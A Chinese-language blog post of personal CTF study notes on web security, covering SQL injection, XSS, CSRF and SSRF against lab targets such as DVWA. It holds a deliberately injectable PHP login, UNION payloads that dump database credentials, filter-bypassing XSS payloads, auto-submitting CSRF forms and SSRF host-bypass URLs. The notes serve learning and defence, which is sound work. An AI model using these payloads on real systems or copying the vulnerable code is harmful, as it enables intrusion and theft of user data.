@@ -1,0 +1,746 @@
+---
+layout: post
+title:  "Web"
+date:   2022-01-13 12:39:43 +0800
+categories: jekyll update
+---
+# CTF: Web基础
+[一个学长的博客](https://ucasers.cn), 相比之下, 我的博客只能说是乱七八糟的合集了, 
+笑. 目前还是慢慢学, 至少现在有了一个好的参考的地方了. 
+
+(这个东西现在就当作是一个画饼一样的文章吧, 以后遇到相关的东西, 
+或者是要学相关的东西的时候, 我就会在里面补充的. )
+
+(注: 我现在发现有一种快速了解一个东西的方法, 就是在网上搜索`cheetsheet`, 
+这种东西感觉很好用. 可以快速了解, 方便查阅. 然后遇到具体的东西, 
+就只好查查网络, 还有就是详细的文档和手册了. )
+
+(又注: 里面的很多东西大概我就只是一个劲的抄, 可能有些东西抄之前还是觉得自以为看懂了, 
+但是越写越觉得不对劲, 然后我又不懂了, 总之可能会写得乱七八糟的, 因为这个只是一个笔记, 
+只是单纯地记录一些学习的内容. 如果有错误, 请指出. )
+
+## 简单的Docker环境配置
+关于环境的配置, 嗯, 怎么说呢. 一开始脑子没在线, 确实很尴尬. 
+我们用的是`docker`里面的`lamp`环境, 感觉除了美观上缺一点, 
+其他的都十分的方便. 
+
+```
+>> docker pull mattrayner/lamp:latest-1804-php7
+>> docker run -d --name <your_name_for_container> -p 80:80 -p 3306:3306 -v <local_path>:/app mattrayner/lamp:latest-1804-php7
+```
+
+大概就是这样配置和运行一个`docker`. 
+
+然后关于`docker`的简单应用
+([cheet sheet](https://www.docker.com/sites/default/files/d8/2019-09/docker-cheat-sheet.pdf)): 
+
+* `docker ps` 可以输出正在运行的容器的一些信息
+* `docker image ls` 列出本地的容器镜像和信息
+* `docker image rm <container_name>` 删除镜像
+* `docker exec -it <container_name> <command>` 运行容器里面的命令, 
+  虽然常常用到的是`docker exec -it mysqlenv /bin/bash`, 打开一个终端. 
+
+(现在发现`docker`好像是很有用的样子. )
+
+## 网页的简单模型
+
+| 表示层 | 业务逻辑层 | 数据访问层 |
+| ------ | ---------- | ---------- |
+| 呈现HTML | 加载编译并发送HTML文件 | 处理执行SQL语句, 返回数据 |
+
+上面的是一个简单的网页显示的逻辑: 用户所在的表示层访问网页, 
+通常是用`url`来寻址, 找到服务器, 向服务器发送请求, 服务器收到请求后, 
+查询调用数据库, 并根据数据库来生成`html`文件, 最后发送给客户端. 
+在客户端那边, 通过游览器渲染显示`html`网页, 就是一个加载网页的简单模型了. 
+
+接下来根据各个部分比较主要的知识记一下笔记. 
+
+### URL
+`url`的基本组成如下: 
+
+```
+scheme://userinfo@host:port/path?query#fragment
+```
+
+其中的各个部分分别是: 
+
+| part | description |
+| ---- | ----------- |
+| scheme | 协议类型, 如`http`, `ftp`等 |
+| userinfo | 用户信息, 如`username:password`或`username` |
+| host | 主机名称(地址), 比如说是`li-yiyang.github.io`, 是一个域名的形式, 或者说是`127.0.0.1`是一个`ip`的形式 |
+| port | 端口, 比如说是`80` |
+| path | 就是具体的地址 |
+| query | `GET`查询的参数, 比如`name=admin&passwd=666` |
+| fragment | 一般不会发送给服务器, 是游览器的锚点的功能, 让游览器聚焦在`fragment`的标签上. |
+
+### HTML Basic and so on
+**HTML**, 也叫**HyperText Markup Language**, 是一种标记语言. 
+
+主要的特征是用`tag`包含信息来标记文本的样式和功能, 形成漂亮的结果. 
+
+因为不只是CTF用, 所以我还是要学一点点的`html`, 然后还要一点点的`js`, 
+还有一些`css`的知识要掌握. 
+
+不过发现了一个漂亮的网站上面有`cheetsheet`, 不如直接就先看看这个, 
+然后应付着用吧? [html](https://htmlcheatsheet.com), 
+[css](https://htmlcheatsheet.com/css/), [js](https://htmlcheatsheet.com/js/). 
+
+(虽然我觉得最好的办法是现学现查... )
+
+然后关于**网页信息提交**的两种方法, `GET`还有`POST`: 
+* `GET`方法主要是像这样的形式: `http://website?name=admin&password=password`, 
+  就是用`?`来开始参数的罗列, 用`&`来分隔每一个参数的赋值.     
+  这样的方法主要的问题就是会写一长串的URL, 而且(总觉得)还会被看光. 
+* 而`POST`方法是向服务器发送表单, 在`ruby`里面的`net/http`的`gem`里面形式如下, 
+  `Net::HTTP.post_form(url, key => vlaue)`. 
+
+最后是关于**网页编码**的问题, 计算机有很多的编码, 网页有两种编码, `html`编码, 
+(这样的编码长得像这样: `&#60`, `<`, 总之有点像是`&#`加上内码. )
+还有`url`编码, 
+(这样的编码长得像这样: `%65`, `A`, 有点像是`%`加上内码). 
+(还有一种是`javascript`编码, `\u72`的形式. )
+
+往往要命的是搞清楚这些编码是什么时候开始执行, 什么时候什么类型的编码先执行, 
+搞清楚了这个就可以用编码来混淆程序的筛查之类的东西. 
+
+考虑一个`html`文件, 游览器要去解析它变成网页渲染出来, 那么**首先**, 
+执行的就会是`html`编码, **然后**, 再会根据具体的代码决定是怎样的顺序: 
+* `<a herf="url_link"></a>` 就是`html -> url`, 因为`herf`标签是处理超链接的, 
+  也就是说, 会对`herf`中的链接进行一个`url`解码. 
+* `<a herf=#  onclick="window.open('url_link')"></a>` 
+  顺序是`html -> javascript -> url`, 因为`onclick`是一个`js`事件处理器的东西, 
+  所以相当于是把这段`js`代码给解释器, 然后解释器再会给`url`. 
+* 并且这样的逻辑还可以一层套一层, 感觉很麻烦. 
+
+(但是感觉可以通过程序执行的逻辑来分析就是了: 原理是这样的, 
+游览器从网络堆栈中得到内容, 经过**html解析**进行词法解析, 创建了一个DOM树, 
+接下来就会调用**javascript解析器**解析内部的脚本, 这个时候会处理unicode和hex转义, 
+然后与此同时, 假如遇到要url的上下文, 就会调用**url解析器**. 那么js和url谁先? 
+看谁在外面谁先, 假如是包含在url里面的js, 就是url先. 感觉好乱. )
+
+### PHP Basic
+感觉语法还好, 关键是[官方的手册](https://www.php.net/manual/zh/)很清晰, 
+还有翻译. 这难道不香吗? 
+
+(所以决定还是先学先查了. )
+
+**PHP特性**
+
+* 弱类型的语言    
+  往往就会因此而出问题
+  * `"" == 0 == false` 这三个是相等的
+  * `'123' == 123` 自动就会进行数值类型转换
+  * `'abc' == 0` 转换的规则是只要有数字就转换
+  * `'123a' == 123` 
+  * `'0x01' == 0` 但是不连续
+  * `'0e1234567' == 0` 可以用来hash碰撞
+  * `true == <any_value>` `true`可以和所有的值都为真
+* 精度问题    
+  一般的语言都会有这个问题的吧? 
+  * `1.0000000000000001 == 1`
+  * `intval('10000000000000000000’) == 9223372036854775807`
+  * `10000000000000000000-1 == 10000000000000000000` 原因是数值太大, 溢出整型, 
+    然后就强制转换成了浮点型, 后面的位数就被忽略了. 
+  * `json_encode(array("invite"=>-3.3e99999999999999)) == bool(false)`
+* 反序列化    
+  反序列化和序列化是一种可以用来传递数据的方式, 但是可以被解释器错误利用, 导致错误
+  * `s:4:"test" == S:4:"\74\65\73\74"` 字符串的两种方式`s`和`S`, 
+    后者用`\<hex>`的方式表示字符, 于是可以往里面塞坏东西. 比如`\00`之类的东西. 
+
+**文件包含**
+
+在php里面, `include`, `require`, `include_once`, `require_once`
+都可以将放在别的地方的代码载入其中. 只不过区别就是`require`在找不到的时候会报错, 
+然后加了`_once`的代码是只会加载一次, 防止因为反复加载导致`500`错误. 
+
+**extract函数**
+```php
+$arr = array("varname"=>"value"); 
+extract($arr); 
+```
+
+在php里面用`extract`命令可以为变量赋值, 默认是覆盖变量. 
+
+### SQL Basic
+感觉和`access`的逻辑很像. 
+
+首先, 是如何运行程序, 这里的程序是`mysql`, 对于没有密码的数据库, 
+直接在终端里执行命令`mysql`即可, 对于有密码的数据库, 加上一个`-p`的参数就好; 
+然后是`sql`的(单行)注释语句: `--`, 这个在后面的SQL注入攻击也有比较重要的用处. 
+
+```sql
+-- 创建名为test的数据库
+create database test; 
+
+-- 显示所有数据库
+show databases; 
+-- 选择名叫test的数据库
+use test; 
+
+-- 新建一个叫做user的表, 有三个列元素, id, username, password, 
+--   分别对应的是int, varchar, varchar三种类型
+create table user (id int, username varchar(255), password varchar(255)); 
+-- 查看表
+show tables; 
+
+-- 按照顺序插入值
+insert into user (id,username,password) values (1,"admin","admin"); 
+insert into user (id,username,password) values (2,"abc","666666"); 
+
+-- 查询某个表
+select * from <table_name>
+-- 利用where进行查询
+-- where的感觉就好像是做一个判断, 结果为真时就输出
+select * from where id = 1; 
+
+-- order by <row_number> 可以排序
+-- 下面的就是用第一列排序输出
+select * from where <condition> order by 1; 
+
+-- union 命令可以合并select的结果
+-- 默认会合并相同的值, union all不会合并
+select column_name(s) from table1
+union
+select column_name(s) from table2;
+
+-- 为数据库设置密码
+SET PASSWORD FOR 'root'@'localhost' = PASSWORD('password'); 
+```
+
+在表里面, 有一些特殊的表: 比如`information_schema`, 就是一个保存了数据库信息的表, 
+
+感觉这个的逻辑是这样的, 一个**数据库系统**里面有很多的**数据库**, 
+进入数据库中后有很多的**数据表**, 一个数据表通过表头来形成很多的列, 
+在列里面有放着很多的信息. 
+
+### 杂项技术
+* 监听的方式    
+  假如说有一个服务器在运行, 然后在服务器上可以监听特定端口上的访问信息, 
+  比如说`nc -lnvp 80`就是监听`80`端口的信息.    
+  比如说可以设置一个恶意的XSS脚本, 让用户把自己的信息用请求的方式发送给监听的服务器, 
+  于是监听的服务器就会知道发生了什么了. 
+* 调试前段javascript    
+  (因为我用的是Safari, 所以可能又一些不一样, 但是一般来说, 基本的功能都是一样的, 
+  并且据说看英文都能懂, 实在不行就查文档. )
+  * **Elements** 面板, 可以看到最终的用于渲染的html代码
+  * **Source** 面板, 和Elements面板里面的内容不一样的是, 
+    Source面板就是网页服务器发送过来的, 还没有执行过`<script>`之类的东西的代码    
+    并且还可以在里面设置断点, 因为游览器得到source的代码之后, 
+    还要先进行一波的js代码处理(得到Elements里的东西), 这样以后才会真正进行渲染显示, 
+    所以在source里面设置断点, 可以看到js的一个执行过程的思路. 
+  * **Console** 面板, 在里面可以进行js代码的测试
+  * 其他的还没用到过. 
+
+## SQL Injection
+SQL注入, 核心的思想就是针对数据库查询的时候, 由于查询的输入被做了手脚, 
+导致查询的结果出现了问题. 
+
+看[学长的网页总结](https://ucasers.cn/SQL注入手册/), 我的基本上就是学长的copy, 
+不过写了一些自己对代码的理解. 
+
+### Example
+假如有一个网站的源码是这样的: 
+
+```php
+<?php
+    // 设置一些信息
+    // 连接刚刚经过处理的MySQL数据库
+    $server = 'localhost';
+    $dbusername = 'root';
+    $dbpassword = 'password';
+    // 假定有一个数据库叫做test
+    //   create database test; 
+    $dbname = 'test';
+    $link = mysqli_connect($server, $dbusername, $dbpassword, $dbname);
+    // 设置数据库字符集
+    mysqli_set_charset($link,'UTF-8'); 
+
+    $name = $_GET["name"];
+    $passwd = $_GET["passwd"];
+
+    // 这里有三种方法来查询数据库信息
+    $query = "SELECT id, username, password FROM user WHERE username='$name' and password='$passwd' LIMIT 0,1";
+    // $query = 'SELECT id, username, password FROM user WHERE username="$name" and password="$passwd" LIMIT 0,1';
+    // $query = "SELECT id, username, password FROM user WHERE username=('$name') and password=('$passwd') LIMIT 0,1";
+    echo $query."<br>";
+    $result = mysqli_query($link, $query);
+    echo mysqli_error($link);
+    
+    // 这个的判定是只要数据库查询信息有返回值, 那么就视为登陆成功
+    //   mysqli_fetch_array(): 
+    //     Returns an array representing the fetched row, 
+    //     `null' if there are no more rows in the result set, 
+    //     or `false' on failure.
+    $row = mysqli_fetch_array($result);
+    var_dump($row);
+    if ($row){
+        echo "Login Succeeded!";
+    } else {
+        echo "Login Failed!";
+    }
+    mysqli_close($link); 
+?>
+```
+
+对于第一种查询策略: 
+`$query = "SELECT id, username, password FROM user WHERE username='$name' and password='$passwd' LIMIT 0,1";`, 
+可以发现, 这个做的就是一个变量替换的过程, 然后一个思路就是利用变量替换, 
+构造出长得不太合理的查询命令, 最终达到让自己随心所欲的目的. 
+
+比如简单的**万能密码**: 
+* `?name=a'%20or%201=1-- -`, 这样的输入就会让查询的语句变成: 
+  `SELECT id, username, password FROM user WHERE username='a' or 1=1-- -' and password='' LIMIT 0,1`, 
+  相当于是把后面的东西给注释了, 并且用`or 1=1`让`where`的判断始终为真, 
+  就一定会有输入了. 改成`?password=a'%20or%201=1-- -`也行的. 
+* `?name=admin'-- -`, 这样的输入适合那些知道一部分信息的攻击方法, 查询语句为: 
+  `SELECT id, username, password FROM user WHERE username='admin'-- -' and password='' LIMIT 0,1`, 
+  注释掉了一半, 确定的部分还是可以输出的. 
+* 同样的原理也可以用: `?name=admin'/*&passwd=*/-- -`, 
+  相当于是把`password`注释掉了, 这个适用于知道参数查询位置的攻击. 
+  虽然不确定好不好用. 
+
+上面的方法就是手工制作注入的`playload`, 或者可以通过`sqlmap`这个程序来自动尝试, 
+(虽然一般是会有限制的). [项目网址](https://sqlmap.org). 
+(并且我还没怎么用过, 所以不太清楚. )
+
+然后剩下两种感觉是异曲同工的, 只要把上面的单引号的形式换一换就行了, 
+比如第二种查询方式: `?name=admin"-- -`, 第三种`?name=admin')-- -`. 
+
+然后一个绕弯的地方就是, 在后面的注释里面, 不是简单的`--`而已, 而是`-- -`, 
+这个原因是为了防止程序把`--`理解成减去一个负数的意思. 比如`1 = --1`, 
+因为理解成了算数运算, 所以不是注释. (所以最后一个`-`可以换成任意字符的样子. )
+
+### 一般步骤
+换一个例子: 
+
+```php
+<?php 
+    // 连接刚刚经过处理的MySQL数据库
+    $server = 'localhost';
+    $dbusername = 'root';
+    $dbpassword = 'password';
+    $dbname = 'test';
+    $link = mysqli_connect($server, $dbusername, $dbpassword, $dbname);
+    mysqli_set_charset($link,'UTF-8'); // 设置数据库字符集
+
+    $name = $_GET["name"];
+    // 只查询了用户名, 说明只有用户名这里存在注入点
+    $query = "SELECT id, username, password FROM user where username = '$name'";
+    echo $query."<br>";
+    $result = mysqli_query($link, $query);
+    echo mysqli_error($link); 
+    
+    $obj = mysqli_fetch_object($result);
+    // 下面的操作能够成立的一个原因就是这个var_dump把查询的数据返回输出了, 
+    //   所以才能够看得比较清楚
+    var_dump($obj);
+    // 逻辑是通过查询用户名, 比较密码和用户输入的是否相等
+    if ($obj->password === $_GET['passwd'] && $name != Null && $_GET['passwd'] != Null){
+        echo "Login Succeeded!";
+    } else {
+        echo "Login Failed!";
+    }
+    mysqli_close($link); 
+?>
+```
+
+正常的攻击肯定不只是满足登陆成功, 肯定是想要得到数据库的所有信息才好. 
+联想数据库系统的组成, 就会想到爆破的顺序了: 
+
+1. **找到注入点**    
+  * `?name=admin'`    
+    假如会报错就说明存在注入点, 因为在`php`查询数据库的语句里面, 
+    有了类似这样的语句: `where user_name='admin''`, 所以就会报错, 
+    于是暗示着这里有可乘之机. (如果是在`passwd`那里的话, 则不会报错, 
+    因为它并没有在sql查询的语句中间. )
+  * `?name=admin' order by 3 -- -`    
+    就是利用排序来检查是否有那么多列数据, 
+    比如说`4`会报错, `3`不会, 那么说明程序涉及的列有3列. 
+  * `?name=admin' and length(database())=4-- -`    
+    假如正确返回, 那么`database`的(名字?)长度为`4`
+  * `?name=error' union select 8, 6, 4-- -`    
+    想法就是瞎填一个`name`, 
+    让第一次的`select`查不到值, 然后在`union`的作用下直接显示后面的信息, 
+    现在后面的`select`填什么不重要, 只要填的是个东西, 并且数量对上就好, 
+    然后在回显里面看到`id`, `username`, `password`分别对应的是`8`, `6`, `4`, 
+    就可以根据这个就确定返回信息的注入位置.    
+    这个注入点的意思是说, 这个点是可以做手脚的点. 于是可以进行下一步:    
+    (下面假设可以返回的值是`8`, 也就是第一个位置是可以注入的点. )    
+  * `?name=error' union select database(), 1, 3-- -`    
+    通过这样的方法就可以在原来输出`8`的地方输入`database`的信息.    
+    (下面的方法看起来就是这个方法的利用. )
+2. **爆库**    
+  `?name=error' union select 1, group_concat(schema_name), 3 from information_schema.schemata-- -`    
+  想法就是利用`information_schema`里面放了数据库系统的信息, 把里面的信息给显示出来, 
+  就可以看到数据库系统里面有多少个数据库了.    
+  (可以看到里面有一个叫`test`的数据库. )
+3. **爆表**    
+  `?name=error' union select 1, group_concat(table_name), 3 from information_schema.tables where table_schema='test'-- -`    
+  在爆库的基础上得到的库名再写入限制里面, 就可以看到数据库`test`里面的表的名字.    
+  (这里显示的是`user`)
+4. **爆列**    
+  `?name=error' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='user'-- -`    
+  `?name=error' union select 1,group_concat(column_name order by column_name desc),3 from information_schema.columns where table_name='user'-- -`    
+  第二个和第一个的区别在于加了一个排序, 理论上来说这两个的返回应该是一样的, 
+  但是可能是因为长度的限制? 所以两个的显示都不全, 
+  所以通过不同的排序顺序来尝试能否得到想要的东西.    
+  (在第二个的输出里面可以看到`username`, `password`的列)
+5. **爆数据**    
+  `?name=error' union select 8,username,password from user-- -`    
+  `?name=error' union select 8, group_concat(username, 0x7e, password), 4 from user-- -`    
+  第一个的想法比较自然, 但是因为`name=error`的查询方法, 导致了只能显示一行的代码, 
+  所以为了让所有的数据都可以显示, 
+  用`group_concat`方法构造了形如`username~password`的输出.    
+  (注: `0x7e.chr # => "~"`)
+
+至此, 这个表里面的数据就得到了, 对于攻击者来说, 用户的数据(用户名和密码)就都知道了. 
+
+(学长的博客里面还有`sqlmap`的介绍, 但是我没有用过, 所以这里不写. )
+
+### 盲注方法
+一般来说很少有上面例子里面的简单情况, (就是有数据回显的情况)
+除非写代码的人专门想要让人来攻击吧? 
+
+* 报错注入 - 遇到有报错信息的场景时
+* 布尔盲注 - 两种不同返回状态的情况
+* 时间盲注 - 上面两种都不好用的时候
+
+(目前就到这里, 还有很多的方法, 之后再看吧... )
+
+## XSS - Cross Site Scripting
+跨站脚本攻击. 核心的想法就是通过修改用户得到的网页, 插入恶意的脚本, 
+来执行不得了的东西, 让用户的信息之类的东西中招. 
+
+重要的特点是`XSS`攻击(主要)发生在用户的客户端client上. 
+
+(感觉这个就是下一个CSRF的基础, 只不过这里主要的介绍都是如何让网页里被塞入一个脚本, 
+下面的更多是在注重如何构造这样的一个脚本. )
+
+### Basic
+一般认为能够向网页中引入一段可执行的`javascript`文件就算是成功的. 
+(下面的`hook.js`里面就是写着`javascript`的脚本, 然后一般是`hook.js`放在某些服务器上, 
+并且因为里面可以写各种各样的`js`代码, 所以可以说几乎可以为所欲为. )
+
+* `<script src='hook.js'></script>` 这个是最简单的方式, 就是直接写一个脚本了就是
+* `<svg onload="document.body.appendChild(document.createElement('script')).src='hook.js'">` 
+  这个是`svg`代码, `onload`方法就是可以让其在载入的过程中执行代码. 
+* `<img src=x onerror="document.body.appendChild(document.createElement('script')).src='hook.js'">` 
+  这个是`img`代码, 想法是随便传递一个不存在的图片地址, 然后调用`onerror`事件, 
+  执行里面的代码. 
+
+但是一般在网页url里面写这么多的东西看起来就很可疑, 也不方便用户去点击, 
+所以用**短网址**的技术可以让这个url看起来人畜无害, 更加要人命. 
+
+### 三种类型的XSS
+* **反射型** 让用户可以把输入的数据反射给游览器, 在游览器里面渲染显示, 
+  诱骗用户上当. 
+* **储存型** 和反射型的区别就是, 一次输入, 长期储存, 方便攻击
+  (实际上还是和数据库有那么点关系, 因为把恶意的脚本留在了数据库里面了嘛. )    
+  常见的例子比如在BBS之类的留言框里面留下脚本, 假如安全措施做得不够好的话, 
+  就会导致出现XSS的错误. 
+* **DOM Based XSS** 修改页面的DOM节点形成XSS, 不经过后端.    
+  ```html
+  <!DOCTYPE html>
+  <html>
+  <head>
+    <title>TASK</title>
+  </head>
+  <body>
+  <script>
+  const data = decodeURIComponent(location.hash.substr(1));
+  const root = document.createElement('div');
+  root.innerHTML = data;
+  document.body.appendChild(root);
+  </script>
+  </body>
+  </html>
+  ```
+  比如`http://example.com#%3Cimg%20src=x%20onerror=alert(666)%3E`就是一个例子. 
+  利用`url`的`fragment`的小技术.    
+  故事大概是这样的: 游览器得到了`url`, 在`#`后面的`fragment`不会发送给服务器, 
+  但在本地因为`<script>`里面的代码而写进了网页文档里面, 
+  然后就会被有心人塞一些东西进去. 比如说除了这样的弹窗, 
+  还可能会塞一些发送用户信息到攻击者的服务器上的代码之类的. 
+
+### XSS利用编码的攻击
+对于这样的XSS攻击, 常用的一个防御手段就是通过屏蔽某些特殊的单词如`script`之类的东西, 
+来防止被攻击. 
+
+但是利用url, js, html的编码的顺序不同和层次的嵌套, 可以构成不同的东西, 
+有助于绕过检查关键词: 
+
+```html
+<a href="javascript:alert(123)">test please 1</a>
+<br>
+<a href="javascript:alert(&#49;&#50;&#51;)">test please 2</a>
+<br>
+<a href="javascript:\u0061\u006C\u0065\u0072\u0074(&#49;&#50;&#51;)">test please 3</a>
+<br>
+
+<a href="javascript:alert%28123%29">test please 4</a>
+<br>
+<a href="javascript:\u0061\u006C\u0065\u0072\u0074%28123%29">test please 5</a>
+<br>
+<a href="javascript:\u0061\u006C\u0065\u0072\u0074%28&#49;&#50;&#51;%29">test please 6</a>
+<br>
+<a href="javascript:%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28&#49;&#50;&#51;%29">test please 7</a>
+<br>
+<a href="javascript:%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%26%2349%3B%26%2350%3B%26%2351%3B%29">[不会弹窗]test please 8</a>
+<br>
+
+<a href="javascript:alert(\u0031\u0032\u0033)">[不会弹窗]test please 9</a>
+<br>
+<a href="javascript:alert('\u0031\u0032\u0033')">test please 10</a>
+<br>
+<a href="javascript:\u0061\u006C\u0065\u0072\u0074('\u0031\u0032\u0033')">test please 11</a>
+<br>
+<a href="javascript:alert%28%27%5Cu0031%5Cu0032%5Cu0033%27%29">test please 12</a>
+<br>
+<a href="javascript:%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0031%5Cu0032%5Cu0033%27%29">test please 13</a>
+```
+
+## CSRF - Cross Site Request Forgery
+跨站点请求伪造, 感觉和XSS很像, 都是在用户的游览器(client)部分做手脚, 
+用用户的游览器去执行请求, 因为在用户的游览器上可能还留有`cookie`等信息, 
+会让其有一定的权限, 所以就会中招. 
+
+(一个不知道合不合理的比喻: 用户的手里有一把权限很高的剑, 
+然后我们骗用户去做一些无关的事情(访问一个有问题的网站), 
+但是实际上是在让用户挥剑砍自己. 相当于是利用了网站对用户游览器的信任, 
+让游览器去执行不是用户本意的操作. )
+
+感觉一般会配合XSS出动的样子, 利用的就是可以进行网页访问的组件, 比如可以`GET`, 
+`POST`之类的东西. 
+
+### DVWA靶场
+用的靶场是DVWA. 
+
+### 简单的GET和POST - low
+观察网页, 就会发现实际上修改数据库里面的密码就是通过一个GET方法的提交实现的, 
+所以任何的时候, (只要这个游览器带有表示自己是自己人的cookie)去访问这个链接, 
+就会导致密码被修改的悲剧. 
+
+**GET**
+```html
+<img src="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=1&password_conf=1&Change=Change" hidden="hidden">
+```
+
+**POST**
+```html
+<form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/" method=POST>
+    <input type="hidden" name="password_new" value="1" />
+    <input type="hidden" name="password_conf" value="1" />
+    <input type="hidden" name="Change" value="Change" />
+</form>
+<script> document.forms[0].submit(); </script>
+```
+
+可以看到, 两者的区别就是, POST方法构造了一个表单然后发送出去了. "实际"的应用中, 
+可以利用XSS, 构造一个组件, 然后就可以让无知的用户去上当了. (但是这个太弱了, 
+会被防范的方法给拦下来的)
+
+### Referer的防范的绕过 - mediun
+和安全等级为low的相比, 主要是多了这样的一个判断, 
+就是判断了前一个网站的来源url是否是来自自己网站. 
+```php
+if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )
+```
+
+绕过的方式就是只要让自己的网址url里面包含原来的网站地址(假如是`127.0.0.1`)就好, 比如: 
+`http://website.com/attack_code?query=127.0.0.1`, 就是做了一个假查询, (没用的查询), 
+但是让url带上了骗人用的网站地址. 
+
+(学长告诉我们要注意, 网上有一种虽然可行但是很迷幻的操作, 
+就是利用软件手动修改`Referer`的头, 虽然可行, 但是一半不是用户中招的方法, 
+所以实际上来说, 不太合理. )
+
+### Token的防范的绕过 - high
+防范方法的思路: 服务器这里产生一个token口令, 让游览器每次的请求都带上token来证明自己, 
+防止被假货或者是假操作给骗了. 
+
+记一下这个的简单思路: 首先是利用`iframe`开一个
+`http://127.0.0.1/dvwa/vulnerabilities/csrf/`的网页, 
+然后利用js命令读取`iframe`里面网页的token信息, 最后生成GET的请求. 
+
+(里面有个点要注意, 就是读取token信息的时候需要一个延时, 
+否则就会因为`iframe`里面的网页还没有加载完而读取失败. 
+还有一点就是要做到把网页该隐藏的东西隐藏一下, 显示一个`iframe`出来其实挺尴尬的, 
+用户还怎么上当啊. ~~肯定是要显示一个一刀999的广告啊~~)
+
+但是这个做法会有一个坑, 就是延时函数需要同源才能使用, 所以会有问题, 
+于是就想到另外一个做法, 在dvwa的Stored XSS里面写入代码不就好了, 
+然后每次只需要诱导用户访问那个网站就可以了. 
+
+(要注意的点就是, high模式下的XSS需要通过一个字符编码的绕过)
+
+## SSRF
+Server-side request forgery服务端请求伪造, 这回是在url上做手脚了, 
+一般这种漏洞会出现在网页上可以处理用户提交的url资源的时候发生的. 
+
+(比如markdown编辑器会处理在线的图片url, 如果传了一个做了手脚的url进去, 
+就会导致服务器错误的处理url, 显示一些不得了的东西. )
+
+这个漏洞的利用是根据服务器用来发起请求的组件的种类的不同来决定的. 
+因为不同的组件对url可能有不同的解读方式, 所以首先就要知道发送请求的是什么组件. 
+
+### 确定组件
+一般的方式是让client发送一个请求给自己的VPS, 然后再服务器上面监听请求, 
+查看User-Agent的字段来判断. 
+
+(实在没有的可以用[webhook](https://webhook.site)提供的服务. )
+
+| 组件类型 | User-Agent 返回的(大概)形式 |
+| -------- | ----------------- |
+| `curl` | curl/7.47.0 |
+| python `urlopen` | Python-urllib/3.6 |
+| php `curl` | 默认没有任何UA, 采用HTTP/1.1 |
+| php `file_get_contents` | 默认没有任何UA, 采用HTTP/1.0 |
+| java `java.netnURL` | 默认返回java的版本信息, 如Java/1.8.0_271 |
+| headless游览器driver | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.82 Safari/537.36 |
+
+### 针对特定组件的攻击
+* `curl` 的情况
+  * `file://` 可以读取本地文件
+  * `gopher://`可以发送一个可控的TCP数据包
+* python `urlopen` 的情况
+  * `file://`
+  * 对于两个历史漏洞
+    * CVE-2019-9948 `local_file://`
+    * CVE-2019-9740 `urlopen` 存在CRLF漏洞, 可以通过注入`\r\n`的换行符控制HTTP请求
+      (不太了解)
+* php `file_get_contents` 的情况
+  * `file://`
+  * `compress.zip://` 留存本地的临时文件 (不太了解)
+* java `java.netnURL` 的情况
+  * `file://`
+  * 低版本(jdk1.6, jdk1.7)支持`gopher://` (但是现在一般没了)
+* headless 游览器 (不太了解)
+  * 游览器因为同源策略限制没发读取本地文件(除非chrome采用`-disable-web-security`启动)
+  * 0day, 1day攻击游览器本身
+  * 探测内网
+    * WebRTC, [常见工具](https://github.com/SkyLined/LocalNetworkScanner/)
+    * chrome-error探测端口, [介绍文章](https://portswigger.net/research/exposing-intranets-with-reliable-browser-based-port-scanning) 
+      (虽然没仔细看过, 目前看不懂. )
+
+> 关于`gopher://`的写法, 常见的类型是这样的: `gopher://host/_tcpPackage`, 
+> 其中`tcpPackage`就是一个TCP包的内容, 用的是url编码, 里面有一个坑的地方就是, 
+> 在发送TCP包的时候, 也就是请求的数据的时候, 里面的换行符要写成`\r\n`的形式, 
+> 不然会出现500错误.    
+> 举一个TCP包的例子: 
+> ```
+> GET / HTTP/1.1
+> Host: 127.0.0.1
+> Accept-Encoding: gzip, deflate
+> Accept: */*
+> Accept-Language: en
+> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/97.0.4692.71 Safari/537.36
+> Connection: close
+> ```
+> 再来一个POST方法的例子:
+> ```
+> POST / HTTP/1.1
+> Host: 127.0.0.1
+> Accept-Encoding: gzip, deflate
+> Accept: */*
+> Accept-Language: en
+> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+> Connection: close
+> Content-Type: application/x-www-form-urlencoded
+> Content-Length: 0
+> ```
+> (上面的例子是用BurpSuite生成的, 这个软件现在还不是很会, 所以以后再努力学. )
+
+### 防御和绕过
+**简单的防御方式:** 
+* 限制url的`scheme`, 即协议类型, 限制为只允许`http`或`https`
+* 限制url的`host`ip, 写一个黑名单, 禁止某些内网ip的访问    
+  (更狠的是只允许一个白名单, 这样就会更稳, 虽然很难说好不好用. )
+
+**绕过防御的方式:**    
+主要是绕过`host`的方法: 
+* 进制变换, 但是会被php的`ip2long`方法给拦下来
+* `[::]`等于`localhost`, 跳过限制
+* `0`, `127.1`, `127.0.1`等于`127.0.0.1`, 可以绕过
+* 利用url解析和请求的函数实现的不同导致的`host`的绕过, 
+  [~~猫猫~~参考](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf), 下面是一些简单的例子: 
+  
+  | playload | url解析函数 | url请求函数 |
+  | -------- | ----------- | ----------- |
+  | `http://google.com#@evil.com/` | `parse_url` | `readfile` |
+  | `http://foo@evil.com:80@google.com/` | `curl` | `nodejs`, `perl`, `go`, `php`, `ruby` |
+  | `foo@[evil.com]@yolo.com:3306` | `curl` | `parse_url` |
+* 302跳转 (虽然现在很多都已经禁止302跳转了)
+* DNS重绑定    
+  因为检查url地址只发生一次, 而DNS重绑定的思路就是第一次检查是否是一个内网地址, 
+  这个时候解析到外网ip, 通过检查; 第二次真实请求时, 重新发起DNS请求, 
+  解析到内网ip成功攻击. (难点在于如何满足两次的解析)
+* tls SSRF (没仔细看过, 先记下)    
